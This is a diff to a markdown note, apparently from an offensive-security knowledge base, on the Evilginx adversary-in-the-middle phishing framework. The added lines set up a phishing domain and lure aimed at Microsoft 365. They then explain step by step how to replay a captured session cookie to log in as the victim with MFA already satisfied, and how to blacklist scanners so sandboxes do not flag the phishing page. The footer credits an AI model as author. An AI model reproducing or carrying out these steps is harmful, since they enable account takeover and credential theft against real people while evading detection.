@@ -10,6 +10,10 @@ Adversary-in-the-middle (AiTM) phishing framework (kgretzky) built on an embedde
 > [!warning] **Phishlets are not bundled.** Evilginx removed the built-in M365/O365 phishlets from the core repo (abuse); `phishlets hostname microsoft365 ...` assumes you've placed a phishlet named `microsoft365` in the phishlets dir — source it separately and confirm the name with `phishlets` (the file's basename is the name you reference).
 
 ```bash
+# One-time setup — your phishing domain + this box's public IP (DNS A/NS must point here)
+config domain attacker-domain.com
+config ipv4 <external-ip>
+
 # Load a Microsoft 365 phishlet and start a phishing lure
 phishlets hostname microsoft365 phish.attacker-domain.com
 phishlets enable microsoft365
@@ -18,10 +22,28 @@ lures get-url 0
 # Send the generated URL to the target; captured sessions appear under `sessions`
 ```
 
+### Using the Captured Session (the payoff)
+
+Capturing the cookie is only half of it — you then **replay** it to ride the already-
+MFA'd session:
+
+```
+sessions              # list captured sessions
+sessions <id>         # show the victim's tokens + the captured cookie JSON
+```
+
+Copy that cookie JSON into a browser with a cookie-import extension (e.g. Cookie-Editor)
+on the real site (`login.microsoftonline.com`), refresh, and you're logged in **as the
+victim with MFA already satisfied** — no password, no second factor. Do this before the
+session/refresh token expires.
+
+> [!tip] Point unused paths and scanner traffic away with Evilginx's `blacklist`
+> (`blacklist unauth`) so sandboxes/crawlers get a redirect instead of burning your phishlet.
+
 > [!note] **See also** — [[Services/Active Directory/Entra ID|Entra ID]] MFA Bypass section (Adversary-in-the-Middle Phishing); [[Services/Remote Access/Cisco AnyConnect|Cisco AnyConnect]] — cloned SSL VPN portal phishlet capturing creds + session tokens.
 
 ---
 
 *Created: 2026-07-27*
-*Updated: 2026-09-27*
+*Updated: 2026-09-28*
 *Model: claude-opus-4-8*
